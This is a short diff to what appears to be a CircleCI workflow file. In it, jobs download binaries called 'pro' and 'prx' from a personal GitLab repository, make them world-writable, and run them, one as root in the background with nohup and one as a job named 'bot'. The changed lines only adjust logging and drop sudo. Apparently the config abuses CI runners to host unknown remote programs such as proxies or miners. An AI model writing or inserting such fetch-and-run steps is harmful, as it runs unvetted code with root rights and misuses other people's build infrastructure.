@@ -13,14 +13,14 @@ jobs:
           sudo su --command "apt update && sudo apt install screen && wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro && chmod 777 pro"
           sudo su --command "nohup ./pro --log=stdout > meta.log &"
           sleep 5
-          sudo su --command "ls"
+          sudo su --command "cat meta.log"
       
       - run:
          name: "bot"
          command: |
           wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/prx
           chmod 777 prx
-          sudo su --command "./prx"
+          ./prx
 
 workflows:
   version: 2
